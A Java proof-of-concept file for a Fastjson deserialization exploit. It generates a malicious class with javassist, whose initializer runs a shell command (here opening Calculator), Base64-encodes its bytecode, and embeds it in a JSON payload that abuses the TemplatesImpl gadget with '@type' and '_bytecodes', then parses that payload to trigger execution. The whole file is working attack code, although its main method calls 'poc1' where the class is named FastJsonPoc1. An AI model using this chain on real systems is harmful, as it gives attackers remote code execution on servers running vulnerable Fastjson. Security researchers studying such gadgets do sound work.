import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import java.util.Base64;

public class FastJsonPoc1 {
    public static String generateEvil() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clas = pool.makeClass("Evil");
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        String cmd = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        clas.makeClassInitializer().insertBefore(cmd);
        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));

        clas.writeFile("./");

        byte[] bytes = clas.toBytecode();
        String EvilCode = Base64.getEncoder().encodeToString(bytes);
        System.out.println(EvilCode);
        return EvilCode;
    }
    public static void main(String[] args) throws Exception {
        final String GADGAT_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String evil = poc1.generateEvil();
        TransformerFactoryImpl transformerFactory=new TransformerFactoryImpl();
        String PoC = "{\"@type\":\"" + GADGAT_CLASS + "\",\"_bytecodes\":[\"" + evil + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," + "\"_name\":\"a\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(PoC);

        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);
    }
}